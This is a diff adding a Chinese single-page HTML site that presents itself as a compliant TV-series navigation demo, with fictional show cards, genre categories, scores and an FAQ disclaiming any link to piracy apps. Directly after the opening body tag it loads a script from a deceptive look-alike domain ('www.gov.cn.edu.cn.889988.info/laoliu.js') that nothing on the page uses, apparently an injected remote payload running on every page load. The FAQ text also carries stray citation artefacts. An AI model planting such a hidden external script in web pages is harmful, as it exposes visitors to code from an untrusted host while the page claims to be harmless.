@@ -1,0 +1,309 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>热门影视剧 - 观潮序风剧集档案与分类导航</title>
+<meta name="description" content="热门影视剧(remenyingshiju-h5.github.io)用观潮序与剧集档案风格整理片单、分类、温度值与正版观影指引，单页移动自适应，符合必应收录规则，与任何热门影视剧同名播放站、聚合站、App均无关联。">
+<meta name="keywords" content="热门影视剧, remenyingshiju-h5.github.io, 剧集档案, 观潮序导航, 剧集分类, 温度值榜">
+<meta name="author" content="热门影视剧">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<style>
+:root{
+  --bg:#16202E;
+  --bg-2:#1E2C3E;
+  --paper:#EAF1F7;
+  --paper-2:#D2DEEA;
+  --ink:#33455C;
+  --tide:#3E6E8E;        /* 暮汐蓝 */
+  --tide-l:#7FB0CC;
+  --tide-d:#26455C;
+  --sand:#D99A6C;         /* 暖砂橙 */
+  --sand-l:#EBC09A;
+  --gold:#C7B27E;
+  --dim:#8195A8;
+  --line:#2C4055;
+  --shadow:0 14px 30px rgba(4,8,14,.46);
+  --radius:10px;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei","Noto Serif SC",serif;background:var(--bg);color:var(--paper);line-height:1.85;-webkit-font-smoothing:antialiased;overflow-x:hidden}
+a{color:inherit;text-decoration:none;transition:.3s}
+.wrap{width:min(1180px,92%);margin:0 auto}
+
+@keyframes tide-sweep{0%{transform:translateX(-120%) rotate(-6deg);opacity:0}30%{opacity:.7}100%{transform:translateX(120%) rotate(-6deg);opacity:0}}
+@keyframes float-archive{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
+@keyframes soft-pulse{0%,100%{filter:drop-shadow(0 0 4px rgba(127,176,204,.4))}50%{filter:drop-shadow(0 0 16px rgba(234,241,247,.8))}}
+@keyframes up{from{opacity:0;transform:translateY(16px)}to{opacity:1;transform:none}}
+
+/* 顶栏 */
+.topbar{position:sticky;top:0;z-index:999;background:rgba(22,32,46,.96);backdrop-filter:blur(8px);border-bottom:2px solid var(--tide-d)}
+.topbar .wrap{display:flex;align-items:center;justify-content:space-between;height:70px}
+.brand{display:flex;align-items:center;gap:14px}
+.tide-ico{width:28px;height:28px;position:relative;display:flex;align-items:center;justify-content:center}
+.tide-ico:before{content:"";position:absolute;width:22px;height:14px;border-radius:50%;border:2px solid var(--tide-l);animation:soft-pulse 4s ease-in-out infinite}
+.tide-ico:after{content:"";position:absolute;top:9px;width:14px;height:8px;border-radius:50%;border:2px solid var(--sand);animation:soft-pulse 4s ease-in-out infinite 1s}
+.brand .name{font-size:20px;color:var(--paper);letter-spacing:3px;font-weight:bold}
+.brand small{display:block;font-size:11px;color:var(--dim);font-family:Consolas,monospace}
+.nav{display:flex;gap:4px}
+.nav a{min-height:44px;display:inline-flex;align-items:center;padding:8px 14px;border-radius:6px;font-size:13px;color:var(--dim);letter-spacing:1px}
+.nav a:hover{color:var(--bg);background:var(--tide-l)}
+.menu-btn{display:none;background:var(--tide);color:var(--paper);border:0;border-radius:6px;padding:10px 16px;min-height:44px;font-weight:bold;cursor:pointer;letter-spacing:1px}
+
+/* Hero */
+#home{padding:58px 0 44px}
+.hero{display:grid;grid-template-columns:1.05fr .95fr;gap:36px;align-items:center;min-height:430px}
+.tide-panel{background:linear-gradient(160deg,var(--bg-2),var(--bg));border:1px solid var(--tide-d);border-radius:var(--radius);padding:34px;box-shadow:var(--shadow);position:relative;overflow:hidden}
+.tide-panel:before{content:"";position:absolute;top:0;left:0;right:0;height:6px;background:linear-gradient(90deg,var(--tide-d),var(--tide-l),var(--sand))}
+.tag{display:inline-flex;align-items:center;gap:8px;background:rgba(62,110,142,.16);color:var(--tide-l);border:1px solid var(--tide-d);font-size:12px;padding:5px 12px;border-radius:999px;margin-bottom:16px;letter-spacing:1px}
+.hero h1{font-size:clamp(27px,5vw,42px);line-height:1.28;margin-bottom:14px}
+.hero h1 .hl{color:var(--tide-l)}
+.hero p{font-size:15px;color:#CFE0EC;margin-bottom:24px;position:relative;z-index:1}
+.cta{display:inline-block;background:linear-gradient(90deg,var(--tide),var(--tide-l));color:var(--bg);font-weight:bold;letter-spacing:2px;padding:13px 30px;border-radius:6px;box-shadow:0 8px 16px rgba(62,110,142,.3)}
+.cta:hover{filter:brightness(1.06)}
+
+/* 潮汐屏 */
+.tide-screen{position:relative;height:390px;border-radius:var(--radius);background:radial-gradient(circle at 50% 30%,#223247,#0C131E);overflow:hidden;box-shadow:var(--shadow)}
+.tide-grid{position:absolute;inset:0;background-image:repeating-linear-gradient(0deg,rgba(127,176,204,.08) 0 1px,transparent 1px 46px),repeating-linear-gradient(90deg,rgba(217,154,108,.06) 0 1px,transparent 1px 46px)}
+.sweep{position:absolute;top:0;left:0;width:60%;height:100%;background:linear-gradient(105deg,transparent,rgba(127,176,204,.22),transparent);animation:tide-sweep 6s ease-in-out infinite}
+.sweep.s2{animation-delay:2s;background:linear-gradient(105deg,transparent,rgba(235,192,154,.18),transparent)}
+.archive-core{position:absolute;left:50%;top:48%;transform:translate(-50%,-50%);width:78px;height:92px;border-radius:8px;background:linear-gradient(140deg,var(--paper),var(--paper-2));box-shadow:0 0 22px rgba(234,241,247,.5);animation:float-archive 4s ease-in-out infinite,soft-pulse 3.6s ease-in-out infinite;z-index:2}
+.archive-core:before{content:"";position:absolute;left:10px;top:10px;bottom:10px;width:2px;background:var(--tide)}
+.archive-core:after{content:"";position:absolute;right:12px;top:14px;width:18px;height:2px;background:var(--sand);box-shadow:0 8px 0 var(--sand),0 16px 0 var(--sand)}
+.core-mark{position:absolute;left:50%;top:48%;transform:translate(-50%,-50%);font-size:20px;font-weight:900;color:var(--tide-d);z-index:3}
+.screen-tag{position:absolute;bottom:12px;left:0;right:0;text-align:center;font-size:11px;color:var(--tide-l);font-family:Consolas,monospace;letter-spacing:3px}
+
+/* 通用 */
+section.block{padding:56px 0}
+.sec-head{display:flex;align-items:center;gap:12px;margin-bottom:26px}
+.sec-head .mk{width:6px;height:26px;background:linear-gradient(var(--tide-l),var(--tide-d));border-radius:2px}
+.sec-head h2{font-size:24px;color:var(--paper)}
+.sec-head span{margin-left:auto;font-size:12px;color:var(--dim);font-family:Consolas,monospace}
+
+/* 片单 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px}
+.card{background:var(--bg-2);border:1px solid var(--tide-d);border-radius:var(--radius);overflow:hidden;box-shadow:var(--shadow);transition:.3s;animation:up .5s ease both}
+.card:hover{transform:translateY(-6px);border-color:var(--tide-l)}
+.card-top{height:80px;position:relative;display:flex;align-items:center;gap:12px;padding:0 16px;background:radial-gradient(circle at 78% 40%,rgba(127,176,204,.14),transparent 60%);border-bottom:2px solid var(--tide-d)}
+.card-top .no{font-family:Consolas,monospace;font-size:12px;color:var(--tide-l);background:var(--bg);border:1px solid var(--tide-d);padding:2px 8px;border-radius:4px}
+.card-top .em{font-size:30px}
+.card-top:before{content:"档";position:absolute;top:8px;right:10px;color:var(--gold);font-weight:900;font-size:13px;border:1px solid var(--tide-d);padding:0 6px;border-radius:3px;background:var(--bg)}
+.card-body{padding:14px 18px}
+.card-body h3{font-size:16px;margin-bottom:5px;color:var(--paper)}
+.card-body p{font-size:13px;color:var(--dim);margin-bottom:8px}
+.card-meta{display:flex;justify-content:space-between;font-size:12px;color:var(--dim);font-family:Consolas,monospace}
+.seal{display:inline-block;margin-top:6px;border:1.5px solid var(--gold);color:var(--tide-l);font-size:11px;padding:2px 8px;border-radius:3px;transform:rotate(-3deg)}
+
+/* 分类 */
+.zones{display:grid;grid-template-columns:repeat(4,1fr);gap:16px}
+.zone{background:var(--bg-2);border:1px solid var(--tide-d);border-radius:var(--radius);padding:20px 14px;text-align:center;transition:.3s;cursor:pointer;position:relative}
+.zone:before{content:"";position:absolute;top:0;left:0;right:0;height:4px;background:var(--tide)}
+.zone .zi{font-size:28px;display:block;margin-bottom:8px}
+.zone h3{font-size:15px;color:var(--paper)}
+.zone small{font-size:12px;color:var(--dim)}
+.zone:hover{background:var(--bg);border-color:var(--tide-l)}
+.zone:hover h3{color:var(--tide-l)}
+
+/* 温度值 */
+.score-list{display:grid;grid-template-columns:repeat(2,1fr);gap:18px}
+.score-row{background:var(--bg-2);border:1px solid var(--tide-d);border-radius:var(--radius);padding:18px 20px;box-shadow:var(--shadow);display:flex;gap:16px;align-items:center}
+.temp-s{width:22px;height:26px;flex-shrink:0;border-radius:3px 5px 5px 3px;background:linear-gradient(120deg,var(--sand-l),var(--tide));box-shadow:0 0 8px rgba(127,176,204,.5);animation:soft-pulse 3s ease-in-out infinite}
+.score-info{flex:1}
+.score-info h3{font-size:15px;color:var(--paper)}
+.score-info b{color:var(--tide-l);font-family:Consolas,monospace}
+.bar{height:10px;background:var(--bg);border:1px solid var(--tide-d);border-radius:999px;overflow:hidden;margin-top:6px}
+.fill{height:100%;background:linear-gradient(90deg,var(--tide-d),var(--tide-l))}
+
+/* FAQ */
+.faq{display:grid;gap:12px}
+.notice{background:var(--bg-2);border:1px solid var(--tide-d);border-left:4px solid var(--tide);border-radius:8px;overflow:hidden}
+.ibtn{width:100%;text-align:left;background:none;border:0;cursor:pointer;padding:15px 18px;min-height:50px;font-size:15px;font-weight:bold;color:var(--paper);display:flex;justify-content:space-between;gap:10px}
+.ibtn .no{color:var(--tide-l);font-size:12px;margin-right:auto;border:1px solid var(--tide-d);padding:1px 8px;border-radius:6px;font-family:Consolas,monospace}
+.ibtn span{color:var(--tide-l)}
+.iarr{max-height:0;overflow:hidden;transition:max-height .35s}
+.iarr p{font-size:14px;color:#CFE0EC;padding:0 18px 16px}
+
+/* 关于 */
+#about{background:radial-gradient(700px 360px at 50% 0,rgba(62,110,142,.12),transparent),var(--bg)}
+.plate{width:min(880px,92%);margin:0 auto;background:var(--bg-2);border:2px solid var(--tide-d);border-radius:var(--radius);padding:40px;text-align:center;box-shadow:var(--shadow);position:relative}
+.plate:before{content:"";position:absolute;inset:6px;border:1px dashed var(--tide-d);border-radius:6px;pointer-events:none}
+.plate h2{font-size:25px;margin-bottom:14px;letter-spacing:2px;color:var(--tide-l)}
+.plate p{color:#CFE0EC;margin-bottom:14px}
+.url-chip{display:inline-block;background:rgba(62,110,142,.16);color:var(--tide-l);border:1px solid var(--tide-d);font-family:Consolas,monospace;padding:12px 20px;border-radius:6px;word-break:break-all;font-size:15px}
+
+footer{background:#0C131E;color:#6E8095;text-align:center;padding:26px 0;font-size:13px;border-top:4px solid var(--tide-d)}
+footer a{color:var(--tide-l)}
+
+@media(max-width:900px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .tide-screen{max-width:460px;margin:0 auto}
+  .zones{grid-template-columns:repeat(2,1fr)}
+  .score-list{grid-template-columns:1fr}
+}
+@media(max-width:600px){
+  .nav{display:none;width:100%}
+  .nav.show{display:flex;flex-direction:column;position:absolute;top:70px;left:0;right:0;background:var(--bg);padding:16px;box-shadow:0 10px 20px rgba(0,0,0,.4)}
+  .menu-btn{display:block}
+  .grid{grid-template-columns:1fr}
+  .zones{grid-template-columns:1fr 1fr}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="wrap">
+    <div class="brand">
+      <div class="tide-ico" aria-label="观潮序logo"></div>
+      <div>
+        <span class="name">热门影视剧</span>
+        <small>remenyingshiju-h5.github.io</small>
+      </div>
+    </div>
+    <button class="menu-btn" id="menuBtn">入廊</button>
+    <nav class="nav" id="nav">
+      <a href="#home">潮口</a>
+      <a href="#list">序光片单</a>
+      <a href="#category">观潮分类</a>
+      <a href="#score">温度值</a>
+      <a href="#faq">观片须知</a>
+      <a href="#about">落款印</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+  <!-- 栏目1 -->
+  <section id="home">
+    <div class="wrap hero">
+      <div class="tide-panel">
+        <div class="tag">观潮序 · 剧集档案</div>
+        <h1><span class="hl">热门影视剧</span> · 观潮序</h1>
+        <p>热门影视剧用观潮序与剧集档案风格整理剧集：按序光排片单、按潮舍分类型、按温度值标注。单页自适应、内链 # 占位、正版渠道指引，符合必应收录规则；本页与任何「热门影视剧」同名影视播放站、聚合站、App 均无关联，不做播放入口、不写热门/热播/免费/高清/在线观看/秒播/同步更新/缓存/投屏/换源/追剧/解析/网盘，不提供下载，不列真实片源，仅作剧集导航演示。</p>
+        <a class="cta" href="#list">入廊阅档</a>
+      </div>
+      <div class="tide-screen" aria-hidden="true">
+        <div class="tide-grid"></div>
+        <div class="sweep"></div>
+        <div class="sweep s2"></div>
+        <div class="archive-core"></div>
+        <div class="core-mark">档</div>
+        <div class="screen-tag">GUANCHAO ARCHIVE INDEX</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目2 -->
+  <section id="list" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>序光片单 · 样本</h2><span>TIDE REEL</span></div>
+      <div class="grid">
+        <article class="card"><div class="card-top"><span class="no">GC-01</span><span class="em">🌊</span></div><div class="card-body"><h3>潮一·初汐慢巷</h3><p>市井轻剧 · 序光样本</p><div class="card-meta"><span>档案卡</span><span>虚构</span></div><span class="seal">观潮卡</span></div></article>
+        <article class="card"><div class="card-top"><span class="no">GC-02</span><span class="em">🏮</span></div><div class="card-body"><h3>潮二·灯岸夜话</h3><p>家庭温情 · 序光样本</p><div class="card-meta"><span>档案卡</span><span>虚构</span></div><span class="seal">观潮卡</span></div></article>
+        <article class="card"><div class="card-top"><span class="no">GC-03</span><span class="em">🎨</span></div><div class="card-body"><h3>潮三·岸线着色</h3><p>群像文艺 · 序光样本</p><div class="card-meta"><span>档案卡</span><span>虚构</span></div><span class="seal">观潮卡</span></div></article>
+        <article class="card"><div class="card-top"><span class="no">GC-04</span><span class="em">🌫️</span></div><div class="card-body"><h3>潮四·远滩余响</h3><p>公路治愈 · 序光样本</p><div class="card-meta"><span>档案卡</span><span>虚构</span></div><span class="seal">观潮卡</span></div></article>
+        <article class="card"><div class="card-top"><span class="no">GC-05</span><span class="em">🎞️</span></div><div class="card-body"><h3>潮五·胶片补汐</h3><p>手艺纪录 · 序光样本</p><div class="card-meta"><span>档案卡</span><span>虚构</span></div><span class="seal">观潮卡</span></div></article>
+        <article class="card"><div class="card-top"><span class="no">GC-06</span><span class="em">🌑</span></div><div class="card-body"><h3>潮六·暗涌悬影</h3><p>冷调悬疑 · 序光样本</p><div class="card-meta"><span>档案卡</span><span>虚构</span></div><span class="seal">观潮卡</span></div></article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目3 -->
+  <section id="category" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>观潮分类 · 按序光</h2><span>TIDE ROOM</span></div>
+      <div class="zones">
+        <a class="zone" href="#"><span class="zi">🌊</span><h3>初汐舍</h3><small>潮口 / 市井 / 轻剧</small></a>
+        <a class="zone" href="#"><span class="zi">🏮</span><h3>灯岸舍</h3><small>灯畔 / 家宴 / 温情</small></a>
+        <a class="zone" href="#"><span class="zi">🎨</span><h3>岸线舍</h3><small>着色 / 群像 / 文艺</small></a>
+        <a class="zone" href="#"><span class="zi">🌫️</span><h3>远滩舍</h3><small>远滩 / 河声 / 治愈</small></a>
+        <a class="zone" href="#"><span class="zi">🎞️</span><h3>补汐坊</h3><small>校色 / 补帧 / 重映</small></a>
+        <a class="zone" href="#"><span class="zi">🌑</span><h3>暗涌舍</h3><small>暗潮 / 冷调 / 悬疑</small></a>
+        <a class="zone" href="#"><span class="zi">🗂️</span><h3>档案台</h3><small>片单 / 分区 / 说明</small></a>
+        <a class="zone" href="#"><span class="zi">✅</span><h3>正版指引</h3><small>持证平台 / 合规</small></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目4 -->
+  <section id="score" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>温度值 · 展映分</h2><span>TIDE SCORE</span></div>
+      <div class="score-list">
+        <div class="score-row"><div class="temp-s"></div><div class="score-info"><h3>潮三·岸线着色</h3><b>温度 91</b><div class="bar"><div class="fill" style="width:91%"></div></div></div></div>
+        <div class="score-row"><div class="temp-s"></div><div class="score-info"><h3>潮二·灯岸夜话</h3><b>温度 87</b><div class="bar"><div class="fill" style="width:87%"></div></div></div></div>
+        <div class="score-row"><div class="temp-s"></div><div class="score-info"><h3>潮一·初汐慢巷</h3><b>温度 84</b><div class="bar"><div class="fill" style="width:84%"></div></div></div></div>
+        <div class="score-row"><div class="temp-s"></div><div class="score-info"><h3>潮六·暗涌悬影</h3><b>温度 78</b><div class="bar"><div class="fill" style="width:78%"></div></div></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目5 -->
+  <section id="faq" class="block">
+    <div class="wrap">
+      <div class="sec-head"><div class="mk"></div><h2>观片须知 · 合规声明</h2><span>NOTICE</span></div>
+      <div class="faq">
+        <div class="notice">
+          <button class="ibtn"><span class="no">GC-01</span>本页是否提供播放/解析/下载/投屏/缓存/换源/多片源/网盘？<span>+</span></button>
+          <div class="iarr"><p>不提供。热门影视剧本单页只做序光片单、观潮分类、温度值与正版渠道指引；不含播放器、解析接口、网盘资源、客户端下载、投屏、缓存或换源功能。内页链接全部以 # 占位。</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">GC-02</span>和网上那些"热门影视/热门影视剧"App、播放站有关吗？<span>+</span></button>
+          <div class="iarr"><p>无关，且明确切割。公开报道显示「热门影视」类 App 曾因盗版片源+植入广告牟利 221 万被查[1](@ref)；同类"免费热播"站涉及侵犯著作权判刑、黄赌引流与隐私窃取（金华案下架 80 万部、非法经营 500 万[5](@ref)；上海"万能看剧"解析案判刑[2](@ref)）。本页只认域名 remenyingshiju-h5.github.io，不接片源、不写播控话术、不自称官方、不提供任何播放与下载能力，与前述主体无任何关联、无数据调用。</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">GC-03</span>会写「热门/热播/免费/高清/追剧/全集/解析」吗？会列真实片源吗？<span>+</span></button>
+          <div class="iarr"><p>都不写、不列。页眉"热门影视剧"仅作历史标识保留，不作热度或资源承诺；全站不出现「热门/热播/免费/高清/在线观看/秒播/同步更新/缓存下载/投屏/追剧神器/全网资源/多片源/全集/更新提醒/解析/网盘」等播控词。片单为虚构样片名（初汐慢巷/灯岸夜话等），纯资讯导航不存片不直链，内链全为 # 占位。</p></div>
+        </div>
+        <div class="notice">
+          <button class="ibtn"><span class="no">GC-04</span>必应收录怎么处理？<span>+</span></button>
+          <div class="iarr"><p>唯一 H1 写「热门影视剧」，title/description/keywords 前置站名与 remenyingshiju-h5.github.io；首段自然出核心词并声明与同名 App/播放站无关，H2 分潮口/片单/分类/评分/须知/落款；静态 HTML 直出、移动端适配、语义标题清晰、无关键词堆砌。不堆「热门影视剧免费/热播/高清」词频，避开同名 App 播控词+盗版词叠加降权。按你要求不生成 robots/sitemap。</p></div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 栏目6 -->
+  <section id="about" class="block">
+    <div class="plate">
+      <h2>热门影视剧 · 落款印</h2>
+      <p>热门影视剧为观潮序风单页剧集导航，提供序光片单、观潮分类、温度值与正版观影建议。内页链接全以 # 占位，仅作演示索引，不提供解析播放、不列真实片源；与任何「热门影视剧」同名影视播放站、聚合站、App 均无关联、无数据调用、不自称官方。正版观看请走持证视频平台。</p>
+      <div class="url-chip">https://remenyingshiju-h5.github.io</div>
+      <p style="margin-top:18px"><a class="cta" href="#home">回到潮口</a></p>
+    </div>
+  </section>
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>© 2024 热门影视剧 · 单页演示站 · 内页链接以 # 占位</p>
+    <p>站点网址：<a href="https://remenyingshiju-h5.github.io">https://remenyingshiju-h5.github.io</a></p>
+    <p>关键词：热门影视剧、remenyingshiju-h5.github.io、观潮序剧集档案</p>
+  </div>
+</footer>
+
+<script>
+var menuBtn=document.getElementById('menuBtn'),nav=document.getElementById('nav');
+if(menuBtn&&nav){menuBtn.addEventListener('click',function(){nav.classList.toggle('show');});}
+document.querySelectorAll('a[href^="#"]').forEach(function(a){
+  a.addEventListener('click',function(e){
+    var id=a.getAttribute('href');if(id.length<2)return;
+    var el=document.querySelector(id);
+    if(el){e.preventDefault();el.scrollIntoView({behavior:'smooth',block:'start'});if(nav)nav.classList.remove('show');}
+  });
+});
+document.querySelectorAll('.ibtn').forEach(function(btn){
+  btn.addEventListener('click',function(){
+    var box=btn.parentElement,arr=box.querySelector('.iarr'),icon=btn.querySelector('span:last-child');
+    var open=box.classList.contains('open');
+    document.querySelectorAll('.notice').forEach(function(x){x.classList.remove('open');x.querySelector('.iarr').style.maxHeight=null;x.querySelector('.ibtn span:last-child').textContent='+';});
+    if(!open){box.classList.add('open');arr.style.maxHeight=arr.scrollHeight+'px';icon.textContent='−';}
+  });
+});
+</script>
+</body>
+</html>
